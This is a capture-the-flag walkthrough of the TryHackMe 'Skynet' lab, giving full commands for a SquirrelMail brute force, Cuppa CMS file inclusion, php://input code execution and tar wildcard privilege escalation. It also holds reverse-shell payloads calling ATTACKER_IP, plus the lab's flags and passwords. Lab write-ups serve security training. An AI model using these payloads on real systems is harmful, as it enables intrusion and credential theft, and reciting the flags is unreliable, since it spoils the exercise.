# Skynet - TryHackMe Walkthrough

## Room Information
- **Link:** https://tryhackme.com/room/skynet
- **Difficulty:** Easy/Medium
- **OS:** Linux
- **Target IP:** 10.49.154.170
- **Created by:** Feadraug

## Scenario
A vulnerable Terminator themed Linux machine. The objective is to enumerate the system, find vulnerabilities, and escalate privileges to root.

## Questions to Answer
1. **What is Miles password for his emails?**
2. **What is the Samba password?**
3. **What is the vulnerability called when you can include a remote file for malicious purposes?**
4. **What is the user flag?**
5. **What is the root flag?**

---

## Attack Overview
1. Port Scanning & Service Enumeration (Nmap)
2. SMB Enumeration (smbclient, enum4linux)
3. Web Enumeration (Gobuster, curl)
4. SquirrelMail Brute Force (Hydra)
5. Email Discovery & SMB Access
6. Hidden Endpoint Discovery
7. Cuppa CMS LFI/RFI Exploitation
8. Command Execution via PHP Filter
9. Privilege Escalation via Tar Wildcard Injection

---

## Phase 1: Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -T4 -p- 10.49.154.170
```

**Results:**
| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80/tcp | open | http | Apache httpd 2.4.18 ((Ubuntu)) |
| 110/tcp | open | pop3 | Dovecot pop3d |
| 139/tcp | open | netbios-ssn | Samba smbd 3.X - 4.X |
| 143/tcp | open | imap | Dovecot imapd |
| 445/tcp | open | netbios-ssn | Samba smbd 4.3.11-Ubuntu |

**Key Observations:**
- Linux machine (Ubuntu)
- Web server running on port 80
- SMB shares available on ports 139/445
- Mail services (POP3/IMAP) available
- Hostname: SKYNET, Workgroup: WORKGROUP

### Service Detection Script Output
```
Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET
|   Domain name: (empty)
```

---

## Phase 2: SMB Enumeration

### Enumerate SMB Shares
```bash
smbclient -L //10.49.154.170 -N
```

**Discovered Shares:**
| Sharename | Type | Comment | Access |
|-----------|------|---------|--------|
| print$ | Disk | Printer Drivers | No Access |
| anonymous | Disk | Skynet Anonymous Share | READ/WRITE |
| milesdyson | Disk | Miles Dyson Personal Share | No Access |
| IPC$ | IPC | IPC Service | N/A |

### Enum4Linux
```bash
enum4linux -a 10.49.154.170
```

**Key Findings:**
- **User Found:** milesdyson (RID: 1000, UID: 1001)
- **Domain:** WORKGROUP
- **Password Policy:** Complexity Disabled, Minimum Length: 5
- **Anonymous Access:** Allowed on IPC$ and anonymous share

### Access Anonymous Share
```bash
smbclient //10.49.154.170/anonymous -N
```

**Commands inside smbclient:**
```
ls
cd logs
ls
get attention.txt
get log1.txt
```

**Files Found:**
```
  attention.txt          163 bytes
  logs/
    log1.txt             471 bytes
    log2.txt             0 bytes
    log3.txt             0 bytes
```

### File Contents

**attention.txt:**
```
A recent system malfunction has caused various passwords to be changed.
All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

**log1.txt (Password Wordlist):**
```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

---

## Phase 3: Web Enumeration

### Initial Web Page
Accessing `http://10.49.154.170/` reveals a Skynet search page with a POST form.

**Form Analysis:**
```html
<form name="skynet" action="#" method="POST">
    <input type="search" class="search">
    <input type="submit" class="button" name="submit" value="Skynet Search">
    <input type="submit" class="button" name="lucky" value="I'm Feeling Lucky">
</form>
```

### Directory Enumeration
```bash
gobuster dir -u http://10.49.154.170 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

**Discovered Directories:**
| Path | Status | Notes |
|------|--------|-------|
| /admin/ | 403 Forbidden | Access denied |
| /config/ | 403 Forbidden | Access denied |
| /server-status/ | 403 Forbidden | Apache status |
| /squirrelmail/ | 302 Redirect | **Webmail Interface!** |

### SquirrelMail Discovery
```bash
curl -s http://10.49.154.170/squirrelmail/ | head -50
```

**SquirrelMail Version:** 1.4.23 [SVN]

**Login Form Fields:**
- `login_username` (Username)
- `secretkey` (Password)

---

## Phase 4: SquirrelMail Brute Force

### Hydra Brute Force
```bash
hydra -l milesdyson -P log1.txt 10.49.154.170 http-post-form \
  '/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect' \
  -t 4
```

**Result:**
```
[80][http-post-form] host: 10.49.154.170   
login: milesdyson   
password: cyborg007haloterminator
```

### Answer to Question 1
> **Miles password for his emails:** `cyborg007haloterminator`

---

## Phase 5: Email Discovery

### Login to SquirrelMail
```bash
curl -s -c /tmp/cookies.txt -d \
  "login_username=milesdyson&secretkey=cyborg007haloterminator&js_autodetect_results=1&just_logged_in=1" \
  http://10.49.154.170/squirrelmail/src/redirect.php -L
```

### Check Inbox
```bash
curl -s -b /tmp/cookies.txt \
  "http://10.49.154.170/squirrelmail/src/right_main.php?mailbox=INBOX"
```

**Emails Found:**
| ID | From | Subject |
|----|------|---------|
| 1 | serenakogan@skynet | (no subject) |
| 2 | serenakogan@skynet | (no subject) |
| 3 | skynet@skynet | **Samba Password reset** |

### Read Samba Password Email (ID: 3)
```bash
curl -s -b /tmp/cookies.txt \
  "http://10.49.154.170/squirrelmail/src/read_body.php?mailbox=INBOX&passed_id=3&startMessage=1"
```

**Email Content:**
```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

### Answer to Question 2
> **Samba Password:** `)s{A&2Z=F^n_E.B`

### Other Emails (For Reference)

**Email 1 & 2 Content:**
```
i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
...
```
*(Appears to be random/AI-generated text - no useful information)*

---

## Phase 6: SMB Access & Hidden Endpoint

### Access Milesdyson Share
```bash
smbclient //10.49.154.170/milesdyson -U "milesdyson%)s{A&2Z=F^n_E.B\`"
```

**Commands inside smbclient:**
```
ls
cd notes
ls
get important.txt
```

**Files Found:**
```
  Improving Deep Neural Networks.pdf
  Natural Language Processing-Building Sequence Models.pdf
  Convolutional Neural Networks-CNN.pdf
  Neural Networks and Deep Learning.pdf
  Structuring your Machine Learning Project.pdf
  notes/
    important.txt
    (Multiple AI/ML markdown files)
```

### important.txt Content
```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

**Key Finding:** Hidden endpoint `/45kra24zxs28v3yd`

---

## Phase 7: Cuppa CMS Discovery

### Access Hidden Endpoint
```bash
curl -s http://10.49.154.170/45kra24zxs28v3yd/
```

**Page Content:**
```html
<center>
<img src='miles.jpg'>
<h2>Miles Dyson Personal Page</h2>
<p>Dr. Miles Bennett Dyson was the original inventor of the neural-net 
processor which would lead to the development of Skynet...</p>
</center>
```

### Discover Admin Panel
```bash
curl -s -o /dev/null -w "%{http_code}" \
  http://10.49.154.170/45kra24zxs28v3yd/administrator/
```

**Result:** HTTP 200 - **Cuppa CMS Login Panel Found!**

### Cuppa CMS Version
```
<title>Cuppa CMS</title>
```

---

## Phase 8: LFI/RFI Exploitation

### Search for Exploits
```bash
searchsploit cuppa cms
```

**Result:**
```
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion
```

### Understanding LFI vs RFI

**Local File Inclusion (LFI):**
- Attacker can include files that are already on the server
- Uses path traversal: `../../../../../../../etc/passwd`
- Limited to files present on the target system

**Remote File Inclusion (RFI):**
- Attacker can include files from external sources
- Uses URLs: `http://attacker.com/shell.php`
- Allows loading malicious code from attacker-controlled server

**In this challenge:** The vulnerability is **Remote File Inclusion (RFI)** because the `urlConfig` parameter accepts external URLs, allowing us to include remote files for malicious purposes.

### Answer to Question 3
> **Vulnerability when you can include a remote file for malicious purposes:** `Remote File Inclusion` or `RFI`

### Test LFI Vulnerability
```bash
curl -s "http://10.49.154.170/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../etc/passwd"
```

**Vulnerable Parameter:** `urlConfig`

### Read /etc/passwd
```bash
curl -s "http://10.49.154.170/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../etc/passwd"
```

**Output (filtered):**
```
root:x:0:0:root:/root:/bin/bash
...
milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash
```

### Read Configuration File (Base64 Encode)
```bash
curl -s "http://10.49.154.170/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php"
```

**Decoded Configuration.php:**
```php
<?php 
class Configuration{
    public $host = "localhost";
    public $db = "cuppa";
    public $user = "root";
    public $password = "password123";
    public $table_prefix = "cu_";
    public $administrator_template = "default";
    public $list_limit = 25;
    public $token = "OBqIPqlFWf3X";
    public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
    public $upload_default_path = "media/uploadsFiles";
    public $maximum_file_size = "5242880";
    public $secure_login = 0;
    public $secure_login_value = "";
    public $secure_login_redirect = "";
} 
?>
```

**Database Credentials Found:**
- Host: `localhost`
- Database: `cuppa`
- Username: `root`
- Password: `password123`

---

## Phase 9: Command Execution

### PHP Input Wrapper for RCE
```bash
curl -s -X POST \
  "http://10.49.154.170/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://input" \
  -d '<?php system("id"); ?>'
```

**Output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Enumerate as www-data
```bash
# Check current user
curl -s -X POST \
  "http://10.49.154.170/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://input" \
  -d '<?php echo shell_exec("whoami"); ?>'

# List home directory
curl -s -X POST \
  "http://10.49.154.170/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://input" \
  -d '<?php echo shell_exec("ls -la /home/milesdyson"); ?>'

# Check crontab
curl -s -X POST \
  "http://10.49.154.170/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://input" \
  -d '<?php echo shell_exec("cat /etc/crontab"); ?>'
```

### Read User Flag
```bash
curl -s "http://10.49.154.170/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../home/milesdyson/user.txt"
```

### Answer to Question 4
> **User Flag:** `7ce5c2109a40f958099283600a9ae807`

---

## Phase 10: Privilege Escalation

### Discovery: Backup Cron Job
From `/etc/crontab`:
```
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
```

### Backup Script Analysis
```bash
curl -s -X POST \
  "http://10.49.154.170/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://input" \
  -d '<?php echo shell_exec("cat /home/milesdyson/backups/backup.sh"); ?>'
```

**backup.sh Content:**
```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

**Vulnerability:** The script uses `tar *` with wildcard in `/var/www/html` directory. This is vulnerable to **Tar Wildcard Injection**.

### Tar Wildcard Injection Explanation
When tar processes a wildcard (`*`), it expands filenames as arguments. Special filenames starting with `--` are interpreted as tar options:
- `--checkpoint=1` - Process checkpoint every 1 file
- `--checkpoint-action=exec=<command>` - Execute command at checkpoint

### Exploitation Steps

**Step 1: Create Reverse Shell Script**
```bash
curl -s -X POST \
  "http://10.49.154.170/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://input" \
  -d '<?php 
  file_put_contents("/var/www/html/shell.sh", "#!/bin/bash\ncat /root/root.txt > /tmp/rootflag.txt\nchmod 777 /tmp/rootflag.txt");
  chmod("/var/www/html/shell.sh", 0755);
  echo "Shell script created";
  ?>'
```

**Step 2: Create Tar Checkpoint Files**
```bash
curl -s -X POST \
  "http://10.49.154.170/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://input" \
  -d '<?php 
  chdir("/var/www/html");
  file_put_contents("--checkpoint=1", "");
  file_put_contents("--checkpoint-action=exec=sh shell.sh", "");
  echo "Checkpoint files created";
  ?>'
```

**Step 3: Verify Files Created**
```bash
curl -s -X POST \
  "http://10.49.154.170/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://input" \
  -d '<?php echo shell_exec("ls -la /var/www/html/ | grep checkpoint"); ?>'
```

**Output:**
```
-rw-r--r-- 1 www-data www-data     0 Mar 27 17:13 --checkpoint-action=exec=sh shell.sh
-rw-r--r-- 1 www-data www-data     0 Mar 27 17:13 --checkpoint=1
-rwxr-xr-x 1 www-data www-data    78 Mar 27 17:13 shell.sh
```

**Step 4: Wait for Cron Job (1 minute)**

The backup script runs every minute as root. When tar executes:
1. It encounters `--checkpoint=1` file
2. Tar interprets this as the `--checkpoint` option
3. It encounters `--checkpoint-action=exec=sh shell.sh`
4. Tar executes `shell.sh` as root

**Step 5: Retrieve Root Flag**
```bash
curl -s -X POST \
  "http://10.49.154.170/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://input" \
  -d '<?php echo shell_exec("cat /tmp/rootflag.txt"); ?>'
```

### Answer to Question 5
> **Root Flag:** `3f0372db24753accc7179a282cd6a949`

---

## Alternative: Reverse Shell for Full Access

### Create PHP Reverse Shell
```bash
# On attacker machine - create shell.php
cat > shell.php << 'EOF'
<?php
$sock=fsockopen("ATTACKER_IP",4444);
$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
EOF

# Start HTTP server
python3 -m http.server 8000

# Start netcat listener
nc -lvnp 4444
```

### Alternative: Direct Command Execution for Reverse Shell
```bash
# Create reverse shell script
curl -s -X POST \
  "http://10.49.154.170/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://input" \
  -d '<?php 
  file_put_contents("/var/www/html/shell.sh", "#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f");
  chmod("/var/www/html/shell.sh", 0755);
  ?>'

# Create tar checkpoint files
curl -s -X POST \
  "http://10.49.154.170/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://input" \
  -d '<?php 
  chdir("/var/www/html");
  file_put_contents("--checkpoint=1", "");
  file_put_contents("--checkpoint-action=exec=sh shell.sh", "");
  ?>'
```

---

## Summary

### Attack Chain Visualization
```
Nmap Scan (Ports 22, 80, 110, 139, 143, 445)
         │
         ▼
SMB Enumeration (anonymous share)
         │
         ├── attention.txt → User: milesdyson
         └── log1.txt → Password wordlist
         │
         ▼
Web Enumeration (SquirrelMail found)
         │
         ▼
Hydra Brute Force (milesdyson:cyborg007haloterminator)
         │
         ▼
Email Discovery (Samba password: )s{A&2Z=F^n_E.B)
         │
         ▼
SMB Access (milesdyson share → important.txt)
         │
         ▼
Hidden Endpoint (/45kra24zxs28v3yd → Cuppa CMS)
         │
         ▼
LFI/RFI Exploitation (alertConfigField.php?urlConfig=)
         │
         ▼
Command Execution (php://input wrapper)
         │
         ▼
Privilege Escalation (Tar Wildcard Injection)
         │
         ▼
ROOT ACCESS
```

### Flags Collected
| Flag | Value |
|------|-------|
| User | `7ce5c2109a40f958099283600a9ae807` |
| Root | `3f0372db24753accc7179a282cd6a949` |

### Answers to All Questions
| # | Question | Answer |
|---|----------|--------|
| 1 | What is Miles password for his emails? | `cyborg007haloterminator` |
| 2 | What is the Samba password? | `)s{A&2Z=F^n_E.B` |
| 3 | What is the vulnerability called when you can include a remote file for malicious purposes? | `Remote File Inclusion` (RFI) |
| 4 | What is the user flag? | `7ce5c2109a40f958099283600a9ae807` |
| 5 | What is the root flag? | `3f0372db24753accc7179a282cd6a949` |

### Key Techniques Used
1. **SMB Enumeration:** Anonymous access, share discovery
2. **Password Brute Forcing:** Hydra with custom wordlist
3. **Webmail Exploitation:** Email enumeration for credentials
4. **Remote File Inclusion (RFI):** Loading malicious files via URL
5. **Local File Inclusion (LFI):** Path traversal, PHP filters
6. **Remote Code Execution:** PHP input wrapper
7. **Tar Wildcard Injection:** Checkpoint-action privilege escalation
8. **Cron Job Abuse:** Scheduled task exploitation

### Tools Used
| Tool | Purpose |
|------|---------|
| nmap | Port scanning & service detection |
| smbclient | SMB share access |
| enum4linux | SMB/user enumeration |
| hydra | Password brute forcing |
| curl | HTTP requests & exploitation |
| gobuster | Directory enumeration |
| searchsploit | Exploit database search |

### Vulnerabilities Exploited
1. **SMB Anonymous Access** - Unauthenticated share access
2. **Weak Password Policy** - Password in wordlist
3. **Information Disclosure** - Sensitive data in emails
4. **Remote File Inclusion (RFI)** - Loading external files via URL parameter
5. **Local File Inclusion (LFI)** - Path traversal in Cuppa CMS
6. **Remote Code Execution** - PHP filter wrapper abuse
7. **Tar Wildcard Injection** - Insecure tar usage in cron job

---

## Defensive Recommendations

### Immediate Fixes
1. **Disable SMB anonymous access** - Require authentication for all shares
2. **Update Cuppa CMS** - Patch LFI/RFI vulnerability or migrate to maintained CMS
3. **Remove PHP wrappers** - Disable `php://input`, `php://filter` if not needed
4. **Secure backup script** - Use absolute paths with tar, avoid wildcards
5. **Implement strong password policy** - Enforce complexity requirements

### Long-term Security
1. **Network segmentation** - Isolate internal services
2. **Principle of least privilege** - Limit cron job permissions
3. **Regular security audits** - Vulnerability scanning & patch management
4. **Email security** - Encrypt sensitive communications
5. **Monitoring & logging** - Detect suspicious activities

---

## References
- [Cuppa CMS LFI/RFI Exploit](https://www.exploit-db.com/exploits/25971)
- [Tar Wildcard Injection](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)
- [TryHackMe Skynet Room](https://tryhackme.com/room/skynet)
- [OWASP - Remote File Inclusion](https://owasp.org/www-community/attacks/Remote_File_Inclusion)

---

*Walkthrough created: March 27, 2026*
*Target: 10.49.154.170*
*Difficulty: Easy/Medium*
*Time to complete: ~45 minutes*